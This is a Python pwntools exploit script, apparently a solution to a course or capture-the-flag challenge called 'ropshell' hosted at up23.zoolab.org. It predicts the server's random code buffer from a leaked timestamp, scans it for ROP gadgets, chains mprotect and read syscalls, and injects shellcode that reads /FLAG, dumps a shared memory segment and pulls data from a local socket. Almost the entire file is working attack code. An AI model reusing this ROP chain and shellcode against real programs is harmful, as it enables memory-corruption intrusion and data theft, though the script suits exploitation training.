#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *
import ctypes

context.arch = 'amd64'
context.os = 'linux'

r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell", shell=False)
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)


r.recvuntil(b"** Timestamp is ")
timestamp = int(r.recvuntil(b'\n'), base=10)
print("timestamp: ", timestamp)

r.recvuntil(b'** Random bytes generated at ')
code_pos = int(r.recvuntil(b'\n'), base=16)
print("code position: ", format(code_pos, '#x'))

libc = ctypes.CDLL('libc.so.6')

mmap_prot = ctypes.c_int
mmap_flags = ctypes.c_int
mmap_offset = ctypes.c_size_t
mmap_return = ctypes.c_void_p
mmap_params = (mmap_return, ctypes.c_size_t, mmap_prot, mmap_flags, ctypes.c_int, mmap_offset)

mmap = libc.mmap
mmap.argtypes = mmap_params
mmap.restype = mmap_return

LEN_CODE = 10 * 0x10000  # Size of memory region to map
PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4
MAP_PRIVATE = 2
MAP_ANONYMOUS = 0x20

code = mmap(code_pos, LEN_CODE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)
#print(type(code))
print("mmap position: ", format(code, '#x'))
codeint = ctypes.cast(code, ctypes.POINTER(ctypes.c_uint32))
#print(type(code))

libc.srand(timestamp)

for i in range(LEN_CODE//4):
    codeint[i] = ctypes.c_uint32(libc.rand() << 16 | libc.rand() & 0xffff)

codeint[libc.rand() % (LEN_CODE//4-1)] = ctypes.c_uint32(0xc3050f)

#####################################################################
# General cmd for all tasks
#####################################################################
pop_rax = asm("""pop rax
ret""")

pop_rdi = asm("""pop rdi
ret""")

pop_rsi = asm("""pop rsi
ret""")

pop_rdx = asm("""pop rdx
ret""")

syscall_ret = asm("""syscall
ret""")

pop_rax_list = []
pop_rax = int.from_bytes(pop_rax, byteorder='little', signed=False)               
#print("pop_rax:", format(pop_rax, "#x"))

pop_rdi_list = []
pop_rdi = int.from_bytes(pop_rdi, byteorder='little', signed=False)               
#print("pop_rdi:", format(pop_rdi, "#x"))

pop_rsi_list = []
pop_rsi = int.from_bytes(pop_rsi, byteorder='little', signed=False)               
#print("pop_rsi:", format(pop_rsi, "#x"))

pop_rdx_list = []
pop_rdx = int.from_bytes(pop_rdx, byteorder='little', signed=False)               
#print("pop_rdx:", format(pop_rdx, "#x"))

syscall_ret_list = []
syscall_ret = int.from_bytes(syscall_ret, byteorder='little', signed=False)               
#print("syscall_ret:", format(syscall_ret, "#x"))

######################################################################
# Search for general calls
######################################################################

byte_array = ctypes.cast(codeint, ctypes.POINTER(ctypes.c_ubyte))

for i in range(LEN_CODE - 3):
    asm_cmd = bytes(byte_array[i:i+4])
    asm_val = ctypes.c_uint32.from_buffer_copy(asm_cmd).value

    if asm_val == syscall_ret:
        syscall_ret_list.append(code + i)
        # print("syscall ret found: ", format(syscall_ret_pos, "#x"))
        break

for i in range(LEN_CODE - 1):
    # print(byte_array[i])
    asm_cmd = bytes(byte_array[i:i+2])
    asm_val = ctypes.c_uint16.from_buffer_copy(asm_cmd).value

    #if pop_rax_pos == 0 or pop_rdi_pos == 0 or pop_rsi_pos == 0 or pop_rdx_pos == 0:
    if asm_val == pop_rax:
        pop_rax_list.append(code + i)
        # print("rax found: ", format(code+i, "#x"))
    elif asm_val == pop_rdi:
        pop_rdi_list.append(code + i)
        # print("rdi found: ", format(code+i, "#x"))
    elif asm_val == pop_rsi:
        pop_rsi_list.append(code + i)
        # print("rsi found: ", format(code+i, "#x"))
    elif asm_val == pop_rdx:
        pop_rdx_list.append(code + i)
        # print("rdx found: ", format(code+i, "#x"))

syscall_ret_pos = syscall_ret_list[-1]
pop_rax_pos = pop_rax_list[-1]
pop_rdi_pos = pop_rdi_list[-1]
pop_rsi_pos = pop_rsi_list[-1]
pop_rdx_pos = pop_rdx_list[-1]

print("================== General ==================")
print("syscall ret found: ", format(syscall_ret_pos, "#x"))
print("pop rax found: ", format(pop_rax_pos, "#x"))
print("pop rdi found: ", format(pop_rdi_pos, "#x"))
print("pop rsi found: ", format(pop_rsi_pos, "#x"))
print("pop rdx found: ", format(pop_rdx_pos, "#x"))
print("=============================================")

#####################################################################
# First Stage: mprotect
#####################################################################
sys_mprotect = p64(pop_rax_pos) + p64(10) + p64(pop_rdi_pos) + p64(code_pos) + p64(pop_rsi_pos) + p64(10 * 0x10000) + p64(pop_rdx_pos) + p64(0x7) + \
                p64(syscall_ret_pos)
sys_read = p64(pop_rax_pos) + p64(0) + p64(pop_rdi_pos) + p64(0) + p64(pop_rsi_pos) + p64(code_pos) + p64(pop_rdx_pos) + p64(1024) + \
                p64(syscall_ret_pos) + p64(code_pos)
# sys_exit = p64(pop_rax_pos) + p64(60) + p64(pop_rdi_pos) + p64(37) + p64(syscall_ret_pos)

#####################################################################
# Second Stage: construct code
#####################################################################
# mov 2f464c4147 "/FLAG"

task1_shellcode = pwnlib.asm.asm('''
                mov rax, 2
                mov r8, 0x47414c462f 
                push r8
                mov rdi, rsp
                mov rsi, 0
                mov rdx, 0
                syscall
                
                mov rdi, rax
                mov rax, 0
                mov rsi, rsp
                mov rdx, 0x400
                syscall

                mov rdx, rax
                mov rax, 1
                mov rdi, 1
                mov rsi, rsp
                syscall

                mov rax, 60
                mov rdi, 37
                syscall
                ret
                ''')

task2_shellcode = pwnlib.asm.asm('''
                mov rax, 29
                mov rdi, 0x1337
                mov rsi, 0x1000
                mov rdx, 0
                syscall

                mov rdi, rax
                mov rax, 30
                mov rsi, 0
                mov rdx, 4096
                syscall

                mov rsi, rax
                mov rax, 1
                mov rdi, 1
                mov rdx, 128
                syscall

                mov rax, 60
                mov rdi, 37
                syscall
                ret
                ''')

task3_shellcode = pwnlib.asm.asm('''
                mov rax, 41
                mov rdi, 2
                mov rsi, 1
                mov rdx, 0
                syscall

                mov rbx, rax

                mov ax, 2
                mov WORD PTR [rsp], ax
                mov ax, 0x3713
                mov WORD PTR [rsp+2], ax
                mov DWORD PTR [rsp+4], 0x0100007f
                mov QWORD PTR [rsp+8], 0x0
                
                mov rax, 42
                mov rdi, rbx
                mov rsi, rsp
                mov rdx, 0x10
                syscall

                mov r8, rsp
                add r8, 16

                mov rax, 0
                mov rdi, rbx
                mov rsi, r8
                mov rdx, 128
                syscall

                mov rax, 1
                mov rdi, 1
                mov rsi, r8
                mov rdx, 128
                syscall

                mov rax, 60
                mov rdi, 37
                syscall
                ret
                ''')

shellcode = task1_shellcode = pwnlib.asm.asm('''
                mov rax, 2
                mov r8, 0x47414c462f 
                push r8
                mov rdi, rsp
                mov rsi, 0
                mov rdx, 0
                syscall
                
                mov rdi, rax
                mov rax, 0
                mov rsi, rsp
                mov rdx, 0x400
                syscall

                mov rdx, rax
                mov rax, 1
                mov rdi, 1
                mov rsi, rsp
                syscall

                mov rax, 29
                mov rdi, 0x1337
                mov rsi, 0x1000
                mov rdx, 0
                syscall

                mov rdi, rax
                mov rax, 30
                mov rsi, 0
                mov rdx, 4096
                syscall

                mov rsi, rax
                mov rax, 1
                mov rdi, 1
                mov rdx, 128
                syscall

                mov rax, 41
                mov rdi, 2
                mov rsi, 1
                mov rdx, 0
                syscall

                mov rbx, rax

                mov ax, 2
                mov WORD PTR [rsp], ax
                mov ax, 0x3713
                mov WORD PTR [rsp+2], ax
                mov DWORD PTR [rsp+4], 0x0100007f
                mov QWORD PTR [rsp+8], 0x0
                
                mov rax, 42
                mov rdi, rbx
                mov rsi, rsp
                mov rdx, 0x10
                syscall

                mov r8, rsp
                add r8, 16

                mov rax, 0
                mov rdi, rbx
                mov rsi, r8
                mov rdx, 128
                syscall

                mov rax, 1
                mov rdi, 1
                mov rsi, r8
                mov rdx, 128
                syscall

                mov rax, 60
                mov rdi, 37
                syscall
                ret
                ''')

# """ Task 1 """
# print(r.recvuntil(b'shell>').decode('utf-8'))

# r.sendline(sys_mprotect + sys_read)
# print(r.recvuntil(b'received.\n').decode('utf-8'))

# r.sendline(task1_shellcode)
# task1_flag = r.recvuntil(b'}').decode('utf-8')
# print("Task 1 Flag:", task1_flag)
# print(r.recvuntil(b'37').decode('utf-8'))

# """ Task 2 """
# print(r.recvuntil(b'shell>').decode('utf-8'))

# r.sendline(sys_mprotect + sys_read)
# print(r.recvuntil(b'received.\n').decode('utf-8'))

# r.sendline(task2_shellcode)
# task2_flag = r.recvuntil(b'}').decode('utf-8')
# task2_flag = task2_flag.replace('\00', '')
# print("Task 2 Flag:", task2_flag)
# print(r.recvuntil(b'37').decode('utf-8'))

# """ Task3 """
# print(r.recvuntil(b'shell>').decode('utf-8'))

# r.sendline(sys_mprotect + sys_read)
# print(r.recvuntil(b'received.\n').decode('utf-8'))

# r.sendline(task3_shellcode)
# task3_flag = r.recvuntil(b'}').decode('utf-8')
# task3_flag = task3_flag.replace('\00', '')
# print("Task 3 Flag:", task3_flag)
# print(r.recvuntil(b'37').decode('utf-8'))

""" Task General """
print(r.recvuntil(b'shell>').decode('utf-8'))
r.sendline(sys_mprotect + sys_read)
print(r.recvuntil(b'received.\n').decode('utf-8'))

r.sendline(shellcode)
task1_flag = r.recvuntil(b'}').decode('utf-8')
print("Task 1 Flag:", task1_flag)

task2_flag = r.recvuntil(b'}').decode('utf-8')
task2_flag = task2_flag.replace('\00', '').replace('\n', '')
print("Task 2 Flag:", task2_flag)

task3_flag = r.recvuntil(b'}').decode('utf-8')
task3_flag = task3_flag.replace('\00', '').replace('\n', '')
print("Task 3 Flag:", task3_flag)

end = r.recvuntil(b'37').decode('utf-8')
end = end.replace('\00', '')
print(end)

r.interactive()
# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
